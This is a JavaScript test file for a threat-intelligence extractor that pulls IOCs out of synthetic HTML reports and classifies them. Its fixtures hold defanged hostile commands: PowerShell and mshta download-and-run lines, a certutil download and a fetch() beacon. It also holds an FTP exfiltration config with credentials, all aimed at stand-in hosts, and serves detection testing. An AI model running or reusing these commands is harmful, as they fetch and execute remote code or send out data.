/**
 * Twenty-two-report audit regressions (tl-candidates-v35 / tl-type-resolver-v14).
 * Generic shapes of the confirmed production defects, with synthetic values —
 * no publisher, report or value condition:
 *
 * D-1. A scheme-less host/path on a delegated but uncommon TLD (".moe") is a
 *      URL; file names, runtimes and documentation placeholders are not.
 * D-2. A URL glued into code inside a typed IOC-table cell
 *      (`DownloadString('…')`) is the cell's observable; the command is not.
 * D-3. "FTP Server: ftp://host" in an IOC section asserts the host (domain);
 *      FTP URLs are not invented as URL Indicators.
 * D-4. 32-hex values under a "Mutex Names" sub-heading are mutex artifacts,
 *      never MD5 Indicators; a sibling "MD5 Hashes" list stays MD5.
 * D-5. Unexpanded template placeholders ($NAME$, %NAME%, <name>) make a URL a
 *      pattern, not an Indicator; ordinary queries / percent-encoding do not.
 * D-6. A parenthesised optional query "(?…)" or an unmatched "(" is publisher
 *      notation, not URL text; balanced path parentheses are kept.
 *
 * The section-tree engine is the production engine; this file pins it.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { extractCanonicalDocumentFromHtml } from './extract/extractHtml.js';
import { extractReportCandidates } from './extractionStages.js';
import { buildCandidateEvidenceRecord } from './evidencePolicy.js';
import { isReportIndicatorMember } from './indicatorMembership.js';
import { THREAT_LIBRARY_CANDIDATE_EXTRACTION_VERSION } from './candidateExtraction.js';
import { OBSERVABLE_TYPE_RESOLVER_VERSION, validateUrlCandidate } from './observableTypeResolver.js';
import { parseIndicatorCell } from './tableSemantics.js';

process.env.THREAT_LIBRARY_SCOPE_ENGINE = 'section_tree';

const SOURCE = 'https://vendor-research.example/blog/twenty-two-report-audit/';
const H1 = 'a1'.repeat(32);
const H2 = 'b2'.repeat(32);
const H3 = 'c3'.repeat(32);
const MUTEX1 = 'd4e5'.repeat(8);
const MUTEX2 = 'f6a7'.repeat(8);
const MD5A = '0b1c'.repeat(8);

function run(inner, { source = SOURCE } = {}) {
  const html = `<!doctype html><html lang="en"><head><title>Audit</title></head><body><article>
<h1>Campaign analysis</h1>
<p>Background paragraph describing the intrusion set and its tooling across several environments.</p>
${inner}
</article></body></html>`;
  const r = extractCanonicalDocumentFromHtml(html, { url: source, finalUrl: source, httpStatus: 200 });
  assert.equal(r.ok, true);
  return extractReportCandidates({ source_type: 'url', source_url: source }, r.document);
}
const persisted = (c) => ({ ...c, has_original_document_occurrence: true, review_status: 'pending', evidence: buildCandidateEvidenceRecord(c) });
const members = (x) => x.candidates.filter((c) => isReportIndicatorMember(persisted(c))).map((c) => `${c.candidate_type}:${c.normalized_value}`).sort();
const values = (x) => x.candidates.map((c) => `${c.candidate_type}:${c.normalized_value}`);

const BODY = '<h2>Technical Analysis</h2><p>The loader decrypts its configuration and contacts the operator infrastructure listed below.</p>';

test('contract versions', () => {
  assert.equal(THREAT_LIBRARY_CANDIDATE_EXTRACTION_VERSION, 'tl-candidates-v41');
  assert.equal(OBSERVABLE_TYPE_RESOLVER_VERSION, 'tl-type-resolver-v18');
});

// ------------------------------------------------- D-1. uncommon delegated TLDs

test('D-1. scheme-less URLs on a delegated uncommon TLD are publisher URL rows', () => {
  const x = run(`${BODY}
<h2>Indicators of Compromise</h2>
<h3>Payload URLs</h3>
<ul><li>files.uploadhost[.]moe/tmcbms.dll</li><li>files.uploadhost[.]moe/5byj86</li></ul>
<h3>Infection Chain</h3>
<ul><li>${H1} – files.uploadhost[.]moe/rv94w8[.]ps1</li><li>${H2} – stage.dropzone[.]moe/gj7umd.ps1</li></ul>`);
  const m = members(x);
  for (const v of ['url:files.uploadhost.moe/tmcbms.dll', 'url:files.uploadhost.moe/5byj86', 'url:files.uploadhost.moe/rv94w8.ps1', 'url:stage.dropzone.moe/gj7umd.ps1', `sha256:${H1}`, `sha256:${H2}`]) {
    assert.ok(m.includes(v), `${v} missing from ${m.join(', ')}`);
  }
  // The path is part of the value: the bare host is not a separate Indicator.
  assert.equal(m.includes('domain:files.uploadhost.moe'), false);
});

test('D-1. delegated-TLD acceptance keeps file names, runtimes and placeholders out', () => {
  assert.equal(validateUrlCandidate('files.uploadhost.moe/x.dll').ok, true);
  assert.equal(validateUrlCandidate('relay.directory.watch/v1/online').ok, true);
  for (const raw of ['doexeloc.dll/doexe.exe', 'Node.js/V8', 'rundll32.exe/regsvr32.exe', 'weixin.exe/WeChat.exe', 'registry.pol/GptTmpl.inf', 'Loader.Program/Main', 'config.Main/run']) {
    assert.equal(validateUrlCandidate(raw).ok, false, raw);
  }
  // A body mention of a legitimate API on a plausible TLD is a URL candidate,
  // never a MODE A Indicator.
  const x = run(`${BODY}
<p>Upon first execution, it pulls live relays from api.relay-directory[.]watch/v1/online and combines them with a hardcoded list.</p>
<h2>Indicators of Compromise</h2><ul><li>${H3}</li></ul>`);
  assert.ok(values(x).includes('url:api.relay-directory.watch/v1/online'));
  assert.deepEqual(members(x), [`sha256:${H3}`]);
});

// --------------------------------------------- D-2. URL glued into a code cell

const COMMAND_TABLE = (rows) => `${BODY}
<h2>Indicators of Compromise</h2>
<table><thead><tr><th>Indicator</th><th>Data</th><th>Note</th></tr></thead><tbody>
<tr><td>IPv4 address</td><td>45.76.93[.]60</td><td>Reverse SSH SOCKS proxy C2</td></tr>
<tr><td>FQDN</td><td>d-7xq.pages[.]dev</td><td>Hosting suspicious payload</td></tr>
${rows}
</tbody></table>`;

test('D-2. a URL glued into a command/code table cell is the row observable', () => {
  const x = run(COMMAND_TABLE(`
<tr><td>Command</td><td>powershell IEX(New-Object Net.WebClient).DownloadString('hxxps://d-7xq.pages[.]dev/sshb64.ps1')</td><td>Downloads a PowerShell script</td></tr>
<tr><td>Command</td><td>powershell iex(iwr("hxxp://188.166.87[.]88/a/run.ps1"))</td><td>Second stage</td></tr>
<tr><td>Command</td><td>cmd /c start \\"\\" mshta.exe(\\"hxxp://loader-cdn[.]top/x.hta\\")</td><td>Escaped string</td></tr>
<tr><td>Command</td><td>fetch('hxxps://api.relay-gate[.]top/v2/beacon',{method:'POST'})</td><td>Function argument</td></tr>`));
  const m = members(x);
  for (const v of ['url:https://d-7xq.pages.dev/sshb64.ps1', 'url:http://188.166.87.88/a/run.ps1', 'url:http://loader-cdn.top/x.hta', 'url:https://api.relay-gate.top/v2/beacon']) {
    assert.ok(m.includes(v), `${v} missing from ${m.join(', ')}`);
  }
  // Code identifiers are never network values (a non-IOC artifact at most),
  // and the command itself is not an IOC.
  const network = x.candidates.filter((c) => ['domain', 'url', 'ip'].includes(c.candidate_type));
  assert.equal(network.some((c) => /webclient|downloadstring|mshta/i.test(c.normalized_value)), false);
  assert.equal(x.candidates.some((c) => /webclient/i.test(c.normalized_value) && c.is_ioc !== false), false);
  assert.equal(x.candidates.some((c) => /IEX\(|powershell/i.test(c.normalized_value)), false);
});

test('D-2. parseIndicatorCell recovers an embedded URL; a code-only cell has none', () => {
  const glued = parseIndicatorCell("powershell IEX(New-Object Net.WebClient).DownloadString('hxxps://d-7xq.pages[.]dev/sshb64.ps1')", null, { typeLabel: 'Command' });
  assert.deepEqual(glued.values.map((v) => `${v.candidate_type}:${v.normalized_value}`), ['url:https://d-7xq.pages.dev/sshb64.ps1']);
  const codeOnly = parseIndicatorCell('powershell IEX(New-Object Net.WebClient).DownloadString($u)', null, { typeLabel: 'Command' });
  assert.deepEqual(codeOnly.values.filter((v) => v.is_ioc !== false), []);
});

// ---------------------------------------------------- D-3. FTP exfil server

test('D-3. "FTP Server: ftp://host" in an IOC section asserts the host as a domain', () => {
  const x = run(`${BODY}
<h2>Indicators of Compromise</h2>
<h3>AutoIt Infection Chain</h3><ul><li>${H1} – stage.dropzone[.]moe/a1.ps1</li></ul>
<h3>Agent Tesla (Variant) Configuration</h3>
<ul><li>FTP Server: ​​ftp[:]//ftp.exfil-mail[.]rs</li><li>FTP username: kel-bin@exfil-mail[.]rs</li><li>FTP password: Xyz)Abc12</li></ul>`);
  const m = members(x);
  assert.ok(m.includes('domain:ftp.exfil-mail.rs'), m.join(', '));
  // The registrable parent of the mailbox is not asserted; no FTP URL type is invented.
  assert.equal(m.includes('domain:exfil-mail.rs'), false);
  assert.equal(values(x).some((v) => v.startsWith('url:ftp')), false);
});

test('D-3. an FTP mirror mentioned in narrative stays outside MODE A Indicators', () => {
  const x = run(`${BODY}
<p>Public tooling can be downloaded from ftp://ftp.mirror-archive.org/pub/tools/ by anyone.</p>
<h2>Indicators of Compromise</h2><ul><li>${H3}</li></ul>`);
  assert.deepEqual(members(x), [`sha256:${H3}`]);
});

// ------------------------------------------------------ D-4. mutex vs MD5

test('D-4. hex values under a "Mutex Names" sub-heading are mutexes, not MD5', () => {
  const x = run(`<h2>Technical Analysis</h2><p>After creating a mutex ${MUTEX1}, the bot collects system information.</p>
<h2>Indicators of Compromise</h2>
<h3>SHA256 Hashes of Payloads</h3><ul><li>${H1}</li></ul>
<h3>MD5 Hashes of Droppers</h3><ul><li>${MD5A}</li></ul>
<h3>Mutex Names</h3><ul><li>${MUTEX1}</li><li>${MUTEX2}</li></ul>
<h3>Telegram Channel</h3><ul><li>t[.]me/operator_dev</li></ul>`);
  const m = members(x);
  assert.ok(m.includes(`sha256:${H1}`));
  assert.ok(m.includes(`md5:${MD5A}`), 'a genuine MD5 list stays MD5');
  assert.ok(m.includes('url:t.me/operator_dev'), 'the next sibling section keeps its scope');
  for (const mx of [MUTEX1, MUTEX2]) {
    assert.equal(m.includes(`md5:${mx}`), false, `mutex ${mx} became an MD5 Indicator`);
    const c = x.candidates.find((cand) => cand.normalized_value.toLowerCase() === mx);
    assert.ok(c, `mutex ${mx} kept as a candidate`);
    assert.equal(c.is_ioc, false);
  }
});

// ------------------------------------------------- D-5. template placeholders

test('D-5. unexpanded template placeholders are patterns, not URLs', () => {
  for (const raw of [
    'http://108.171.195.163:8000/$FILE_NAME$.txt',
    'http://203.0.113.50/%APPDATA%/x.bin',
    'http://dl-host.top/files/%3Cfilename%3E.zip',
    'https://dl-host.top/u/<user>/a.exe',
    'https://dl-host.top/p/[VictimGUID]/b.exe'
  ]) {
    const v = validateUrlCandidate(raw);
    assert.equal(v.ok, false, raw);
    assert.equal(v.reason, 'template_placeholder', raw);
  }
  for (const raw of [
    'https://dl-host.top/get?id=%41%42%43&lang=en',
    'https://dl-host.top/q%E2%80%9Cx%E2%80%9D',
    'https://dl-host.top/pay?amount=$5&cur=usd',
    'https://dl-host.top/a/%20ABC%20/b.php',
    'https://dl-host.top/a/%ABC%20/b.php'
  ]) {
    assert.equal(validateUrlCandidate(raw).ok, true, raw);
  }
  // An environment-variable filesystem path is a path artifact, not a template URL.
  assert.equal(validateUrlCandidate('%APPDATA%\\svc.exe').resolved_type, 'file_path');
});

test('D-5. a placeholder URL in an IOC table is not an Indicator; its host row stays', () => {
  const x = run(COMMAND_TABLE(`
<tr><td>IPv4 address</td><td>108.171.195[.]163</td><td>Hosting suspicious payload</td></tr>
<tr><td>Command</td><td>certutil.exe -urlcache -split -f hxxp://108.171.195[.]163:8000/$FILE_NAME$.txt</td><td>Download attempt</td></tr>`));
  const m = members(x);
  assert.ok(m.includes('ip:108.171.195.163'));
  assert.equal(m.some((v) => v.includes('FILE_NAME')), false, m.join(', '));
});

// --------------------------------------------- D-6. parenthesis boundaries

test('D-6. a parenthesised optional query is notation; the canonical URL is kept', () => {
  const token = 'QUJDREVGR0hJSktMTU5PUA';
  const x = run(`${BODY}
<h2>Indicators of Compromise</h2>
<p>Case study URLs:</p>
<ul><li>hxxps://lure-host[.]com/wp-content/bin/Verify/Code/index.htm(?/1.${token})</li>
<li>hxxps://lure-host[.]com/files/report_(final).pdf</li>
<li>hxxp://lure-host[.]com/dl/get.php?f=a%28b%29</li>
<li>hxxps://lure-host[.]com/x/open.php(</li></ul>`);
  const m = members(x);
  for (const v of [
    'url:https://lure-host.com/wp-content/bin/Verify/Code/index.htm',
    'url:https://lure-host.com/files/report_(final).pdf',
    'url:http://lure-host.com/dl/get.php?f=a%28b%29',
    'url:https://lure-host.com/x/open.php'
  ]) assert.ok(m.includes(v), `${v} missing from ${m.join(', ')}`);
  // No candidate keeps the annotation or its encoded payload.
  assert.equal(x.candidates.some((c) => c.normalized_value.includes(token) || /\(\?/.test(c.normalized_value)), false);
  assert.equal(x.candidates.some((c) => /\([^)]*$/.test(c.normalized_value) && c.candidate_type === 'url'), false);
});

test('D-6. prose parentheses around a URL are not part of it', () => {
  const x = run(`${BODY}
<h2>Indicators of Compromise</h2>
<ul><li>Second stage (hosted at hxxp://cdn-relay[.]top/a/b.php).</li><li>Panel: hxxps://panel-node[.]top/admin/(login)</li></ul>`);
  const m = members(x);
  assert.ok(m.includes('url:http://cdn-relay.top/a/b.php'), m.join(', '));
  assert.ok(m.includes('url:https://panel-node.top/admin/(login)'), m.join(', '));
});
